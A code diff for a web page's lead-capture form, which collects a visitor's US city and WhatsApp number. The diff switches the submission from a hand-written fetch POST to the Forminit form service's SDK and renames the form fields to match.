@@ -275,6 +275,7 @@ h1{font-family:'Bebas Neue',sans-serif;
   color:var(--gold);letter-spacing:1px;}
 
 </style>
+  <script src="https://forminit.com/sdk/v1/forminit.js"></script>
 </head>
 <body>
 
@@ -315,7 +316,7 @@ h1{font-family:'Bebas Neue',sans-serif;
 
     <div class="field">
       <label>Your US City</label>
-      <select id="cityInput" name="city">
+      <select id="cityInput" name="fi-sender-city">
         <option value="" disabled selected>Select city...</option>
         <option>Jersey City</option><option>Sunnyvale</option><option>Fremont</option>
         <option>Sugar Land</option><option>Edison</option><option>Cupertino</option>
@@ -331,7 +332,7 @@ h1{font-family:'Bebas Neue',sans-serif;
       <label>WhatsApp (US)</label>
       <div class="pfx">
         <span>+1</span>
-        <input type="tel" id="phoneInput" name="whatsno" placeholder="(555) 000-0000" maxlength="14">
+        <input type="tel" id="phoneInput" name="fi-sender-phone" placeholder="(555) 000-0000" maxlength="14">
       </div>
     </div>
 
@@ -425,18 +426,13 @@ function handleClaim(){
   if(!city){highlight('cityInput');return;}
   if(phone.length<10){highlight('phoneInput');return;}
 
-  // Send data to Forminit
-  const formData = new URLSearchParams();
-  formData.append('city', city);
-  formData.append('whatsno', '+1' + phone);
-  formData.append('form_id', 'pnng9u79qsk');
+  // Send data using Forminit SDK
+  const forminit = new Forminit();
+  const formData = new FormData();
+  formData.append('fi-sender-city', city);
+  formData.append('fi-sender-phone', '+1' + phone);
 
-  fetch('https://forminit.com/f/pnng9u79qsk', {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-    body: formData.toString()
-  }).catch(err => console.error('Form Submission Error:', err));
+  forminit.submit('pnng9u79qsk', formData).catch(err => console.error('Forminit Submission Error:', err));
 
   document.getElementById('overlay').classList.add('on');
   document.body.style.overflow='hidden';
